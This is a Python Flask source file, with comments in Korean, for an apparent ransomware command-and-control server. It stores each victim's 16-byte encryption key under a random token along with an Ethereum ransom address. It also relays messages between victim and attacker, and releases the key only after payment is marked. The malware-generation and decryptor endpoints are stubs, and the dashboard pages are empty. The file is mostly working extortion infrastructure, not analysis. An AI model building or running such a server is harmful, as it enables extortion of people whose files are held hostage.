from flask import Flask
from flask import request, send_file
from Database import Database
import random
import time
import os
app = Flask(__name__)

db = Database("./database/db.json")

# 헬로 월드 보여주는 놈
@app.route('/')
def hello_world():
    return 'Hello, World!'

# Decryptor 바이너리 반환
# 언제? 관리자가 코인을 받았을 때만 다운로드 가능
@app.route("/get_decryptor")
def get_decryptor():
    return send_file("Database.py", as_attachment=True)

# Malware 생성 후 다운로드
@app.route("/gen_malware")
def gen_malware():
    return send_file("app.py", as_attachment=True)

# malware에서 key를 서버에 저장
# 서버는 token을 랜덤하게 생성하고, DB에 저장한 뒤 token 반환
# /save_token?key={16bytes_key}
@app.route("/save_token")
def save_token():
    key = request.args.get("key")
    token = random.randint(1000000000, 9999999999)
    etheremum_address = "0x1e2f3d4c5b6a7d8e9f0a1b2c3d4e5f6a7b8c9d0"
    db.set(key=token, value={
        # 암호화에 사용된 키 (16bytes)
        "key": key,
        # 이더리움을 보낼 주소
        "etheremum_address": etheremum_address,
        # 만들어진 시간
        "created_at": time.time(),
        # 돈을 지불 했는지?
        "is_paid": False,
        # 채팅 메시지
        "messages": []
    })
    return {
        "token": token,
        "etheremum_address": etheremum_address
    }

# 현황을 보여주는 페이지
@app.route("/dashboard")
def dashboard():
    pass

# 현재 상황을 보여주는 페이지 (악성코드 별)
# /information?token={token}
# token = /save_token에서 받은 token
@app.route("/information")
def information():
    pass

# malware 피해자가 공격자에게 메시지를 보낼 때 사용
# 단순히 DB에 저장합시다
# /send_msg?token={token}&msg={msg}
# token = /save_token에서 받은 token
# msg = 보낼 메시지
@app.route("/send_msg")
def send_msg():
    token = request.args.get("token")
    data = db.get(key=token)
    print(data)

    msg = request.args.get("msg")
    data["messages"] = data.get("messages", [])
    data["messages"].append(msg)
    
    db.set(token, data)
    return {
        "messages": data["messages"]
    }
# 현재 메시지 목록을 반환합니다.
# 단순히 DB에서 뽑아옵니다.
# /get_msg?token={token}
# token = /save_token에서 받은 token
@app.route("/get_msg")
def get_msg():
    token = request.args.get("token")
    data = db.get(token)
    return {
        "messages": data["messages"]
    }

# 키를 반환합니다.
# Decryptor가 키를 요청할 때 사용합니다.
@app.route("/get_key")
def get_key():
    token = request.args.get("token")
    data = db.get(token)
    if data["is_paid"] == False:
        return {
            "status": False,
            "error": "Not paid"
        }
    return {
        "status": True,
        "key": data.get("key", "")
    }

if __name__ == '__main__':
    app.run(debug=True)